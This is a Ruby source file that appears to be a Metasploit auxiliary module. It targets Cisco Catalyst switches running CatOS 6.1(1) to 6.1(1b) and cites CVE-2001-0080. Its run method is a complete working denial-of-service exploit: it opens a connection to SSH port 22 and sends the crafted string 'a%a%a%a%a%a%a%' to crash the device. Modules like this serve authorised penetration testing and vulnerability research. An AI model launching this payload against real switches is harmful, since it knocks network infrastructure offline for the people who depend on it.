##
# $Id$
##

require 'msf/core'

module Msf

class Auxiliary::Dos::Cisco::Catalyst_SSH_DoS < Msf::Auxiliary

	include Exploit::Remote::Tcp

	def initialize
		super(
			'Name'		=> 'Cisco Catalyst SSH Denial of Service',
			'Description'	=> %q{
				Sending "a%a%a%a%a%a%a%" to Catalysts running CatOS 6.1(1) to 6.1(1b) makes it go b00m.
			},
			'Author'	=> 'grutz',
			'License'	=> BSD_LICENSE,
			'Version'	=> '$Rev$',
			'References'	=> [
						['BID', '2117'],
						['OSVDB', '7183'],
						['CVE', '2001-0080'],
						['URL', 'http://www.cisco.com/warp/public/707/catalyst-ssh-protocolmismatch-pub.shtml'],
			]
		)

		register_options(
			[
				Opt::RPORT(22),
			], self.class
		)
	end

	def run
		connect
		print_status("Sending DoS request...")
		sock.put("a%a%a%a%a%a%a%")
		disconnect
	end

end
end
